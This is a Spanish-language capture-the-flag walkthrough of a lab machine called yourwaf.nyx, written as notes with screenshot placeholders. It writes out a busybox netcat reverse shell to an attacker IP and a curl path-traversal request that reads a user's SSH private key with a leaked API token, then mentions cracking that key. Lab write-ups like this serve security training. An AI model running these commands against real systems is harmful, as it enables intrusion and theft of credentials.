Hacemos el escaneo con nmap:
![[Pasted image 20240612173148.png]]
Si ponemos el puerto 80 en el navegador, vemos que se nos muestra un dominio:
![[Pasted image 20240612173247.png]]
Lo añadimos en el /etc/hosts:
![[Pasted image 20240612173327.png]]
Y la web ya carga correctamente:
![[Pasted image 20240612173341.png]]
Y si miramos el puerto 3000, vemos que no estamos autorizados:
![[Pasted image 20240612173457.png]]
Vamos a intentar encontrar algún subdominio de yourwaf.nyx:

Y encontramos el subdominio de maintenance.yourwaf.nyx:
![[Pasted image 20240612175425.png]]
Pero si intentamos lanzar una reverse shell, vemos que no tenemos permiso para recibirla, lo cual significa que probablemente haya un firewall:
![[Pasted image 20240612175549.png]]
Vamos a probar con la reverse shell de busybox:
```bash
busybox nc 192.168.0.28 443 -e bash
```
![[Pasted image 20240612175930.png]]
![[Pasted image 20240612175940.png]]
Una vez dentro, ejecutamos pspy para ver si hay algo corriendo en segundo plano, donde vemos un script llamado copylogs.sh:
![[Pasted image 20240612180251.png]]
Este es el contenido del script:
![[Pasted image 20240612180323.png]]
Y vemos que root ejecuta de forma automática un server.js:
![[Pasted image 20240612180613.png]]
Y este es el contenido, donde levanta por el puerto 3000 un servicio HTTP usando una apiToken, donde vemos que recibe con /readfile la apiToken:
![[Pasted image 20240612181116.png]]
![[Pasted image 20240612180650.png]]
Por lo que lanzamos con curl la siguiente petición pasandole la API al readfile:
```bash
curl 'http://192.168.0.44:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d'
```
Y vemos que funciona:
![[Pasted image 20240612181858.png]]
Tras varias pruebas, vemos que podemos leer el id_rsa:
```bash
curl "http://192.168.0.44:3000/readfile?file=../../../../../../../../home/tester/.ssh/id_rsa&api-token=8c2b6a304191b8e2d81aaa5d1131d83d"
```
![[Pasted image 20240612182031.png]]
Y crackeamos dicho archivo:
![[Pasted image 20240612182954.png]]
